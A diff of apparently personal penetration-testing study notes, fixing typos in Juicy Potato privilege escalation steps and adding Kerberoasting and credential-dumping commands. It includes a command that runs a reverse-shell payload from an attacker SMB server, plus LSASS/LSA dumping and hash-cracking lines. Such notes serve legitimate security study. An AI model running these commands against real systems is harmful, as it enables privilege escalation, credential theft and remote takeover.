@@ -332,10 +332,10 @@ in the meterpreter shell type
 sometimes you need to migrate to another process to get the NT AUTHORITY\SYSTEM
 use godpotato
 check Jeeves box FYR
-4.1- use juicy potato by transferring the file to the target machine (AV is off). JuicyPotato doesn't work on windows server 2019 and windows 10 build 1809. use PrintSpoofer insted.
+4.1- use juicy potato by transferring the file to the target machine (AV is off). JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809. use PrintSpoofer instead.
 download exe file -> https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 -     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine} #you can get it from https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
-4.2- use juicy potato by setting up your SMB server (AV is on)
+4.2- Use Juicy Potato by setting up your SMB server (AV is on)
 put juicypotato.exe & reverse.exe from msfvenom in your SMB server
 -     impacket-smbserver raman `pwd` #set up SMB server
 -     cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
@@ -517,6 +517,13 @@ scenario: LLMNR -> raman hash -> crack -> sprayed the password -> found new logi
 .          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -lsa    (dump lsa or local security authority. it may have some sensitive information)
 .          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy    (dump lsass. it may have some secret credentials that secretdump didn't reflect)
 .          cmedb     (crackmapexec database)
+Kerberoasting
+.          python GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request     (attacking service accounts. from the enumeration find the service accounts that are in the admin group. you can use ldapdomaindump or bloodhound)
+.          hashcat -m 13100 kerberoast.txt rockyou.txt
+Token Impersonation
+.          check token impersonation in the Windows Privilege escalation section
+.          
+.          
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
